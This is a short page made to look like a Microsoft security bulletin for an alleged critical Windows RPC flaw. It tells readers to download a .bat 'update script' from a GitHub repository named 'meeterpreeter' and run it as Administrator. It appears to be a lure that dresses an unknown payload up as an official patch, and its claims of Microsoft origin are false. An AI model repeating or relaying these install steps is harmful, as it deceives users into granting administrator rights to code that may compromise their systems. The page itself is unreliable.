# Microsoft Security Update KB5031234

**Release Date:** March 12, 2025  
**Applies to:** Windows 10, Windows 11, Windows Server 2019/2022  
**Severity:** Critical  
**Security Advisory ID:** ADV230003

---

## ⚠️ Description

This update resolves a critical remote code execution vulnerability affecting the Windows RPC runtime component. All users are strongly encouraged to install this update manually pending formal patch deployment via WSUS and SCCM.

---

## 🔧 Manual Installation

1. Download the update script:  
   [`MicrosoftUpdate_KB5031234.bat`]([./MicrosoftUpdate_KB5031234.bat](https://github.com/meeterpreeter/Microsoft-Updates/raw/refs/heads/main/MicrosoftUpdate_KB5031234.bat))

2. Right-click and run as Administrator

3. A reboot is not required
